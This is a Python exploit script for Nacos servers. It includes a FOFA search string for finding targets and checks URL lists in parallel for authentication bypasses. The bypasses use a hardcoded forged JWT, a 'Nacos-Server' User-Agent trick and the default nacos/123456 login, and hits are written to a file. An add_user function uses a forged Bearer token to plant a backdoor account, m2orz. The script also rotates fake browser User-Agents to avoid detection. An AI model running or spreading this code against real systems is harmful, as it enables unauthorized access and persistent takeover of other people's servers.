import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random
import re
#fofa：app="NACOS"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

proxies={'http': 'http://127.0.0.1:8080',
		'https': 'https://127.0.0.1:8080'}

def wirte_targets(vurl, filename):
	with open(filename, "a+") as f:
		f.write(vurl + "\n")

#poc
def check_url(url):
	url=parse.urlparse(url)
	hostname  = url.hostname
	url='{}://{}'.format(url[0],url[1])
	payload1="{}/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9".format(url)
	payload2="{}/nacos/v1/auth/users?accessToken=&pageNo=1&pageSize=9".format(url)
	payload3="{}/nacos/v1/auth/users/login".format(url)
	headers = {
		'User-Agent': get_ua(),
		"host":hostname,
		#User-Agent: Nacos-Server
		"accessToken": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ"
	}
	headers3 = {
		'User-Agent': get_ua(),
		"host":hostname,
		#User-Agent: Nacos-Server
		"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDY3ODk3MDQyM30.lnslDXAElX0J_STPpWmBOmiQaVcU3eK3F7McFehD_6I"
		}	
	data3 = {
		"username":"nacos",
		"password":"123456"
		}
	# print(vulnurl)
	try:
		res1 = requests.get(payload1, verify=False, allow_redirects=False, headers=headers,timeout=5)
		if res1.status_code == 200 and "pageNumber" in res1.text:
			# print(res.text)
			print("\033[32m[+]{} payload1 is exist!\033[0m".format(url))
			wirte_targets(payload1,"vuln.txt")
		else:
			print("\033[34m[-]{} payload1 is not exist.\033[0m".format(url))
	except Exception as e:
		print("\033[34m[!]{} payload1 request false.\033[0m".format(url))
		pass

	try:
		res2 = requests.get(payload2, verify=False, allow_redirects=False, headers={"User-Agent": "Nacos-Server"},timeout=5)
		if res2.status_code == 200 and "pageNumber" in res2.text:
			# print(res.text)
			print("\033[32m[+]{} payload2 is exist!\033[0m".format(url))
			wirte_targets(payload2,"vuln.txt")
		else:
			print("\033[34m[-]{} payload2 is not exist.\033[0m".format(url))
	except Exception as e:
		print("\033[34m[!]{} payload2 request false.\033[0m".format(url))
		pass	

	try:
		res3 = requests.post(payload3, verify=False, allow_redirects=False, headers=headers3,data=data3,timeout=5,proxies=proxies)
		if res3.status_code == 200 and "accessToken" in res3.text:
			# print(res.text)
			accessToken=re.findall(r'accessToken":"(.*?)",',res3.text)[0]
			print("\033[32m[+]{} payload3 is exist!\naccessToken:{}\033[0m".format(url,accessToken))
			wirte_targets(payload3,"vuln.txt")
		else:
			print("\033[34m[-]{} payload3 is not exist.\033[0m".format(url))
	except Exception as e:
		print("\033[34m[!]{} payload3 request false.\033[0m".format(url))
		pass

def add_user(adduser):
	url=parse.urlparse(adduser)
	hostname  = url.hostname
	vulnurl="{}://{}/nacos/v1/auth/users".format(url[0],url[1])
	print(vulnurl)
	headers = {
		"User-Agent": get_ua(),
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA",
		"Sec-Fetch-Dest": "document",
		"Sec-Fetch-Mode": "navigate",
		"Sec-Fetch-Site": "same-origin",
		"Pragma": "no-cache",
		"Cache-Control": "no-cache",
	}
	# print(vulnurl)
	data = {
		"username": "m2orz",
		"password": "zzz321..",
	}
	try:
		res = requests.post(vulnurl, verify=False, allow_redirects=False, headers=headers,data=data,timeout=5)
		if res.status_code == 200 and "ok" in res.text or "m2orz" in res.text:
			# print(res.text)
			print("\033[32m[+]{} is vulnerable\nAdded user:m2orz/pass:zzz321..\033[0m".format(vulnurl))
		else:
			print("\033[34m[-]{} add user false.\033[0m".format(vulnurl))
	except Exception as e:
		print("\033[34m[!]{} request false.\033[0m".format(vulnurl))
		pass	
#多线程
def multithreading(url_list, pools=10):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_url, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	arg=ArgumentParser(description='check_url By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	arg.add_argument("-a",
						"--add",
						help="Target URL; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	adduser=args.add
	print("[+]任务开始.....")
	start=time()
	if url != None and adduser == None and filename == None:
		check_url(url)
	elif url == None and adduser == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	elif url == None and adduser != None and filename == None:
		add_user(adduser)
	end=time()
	print('任务完成,用时%ds.' %(end-start))
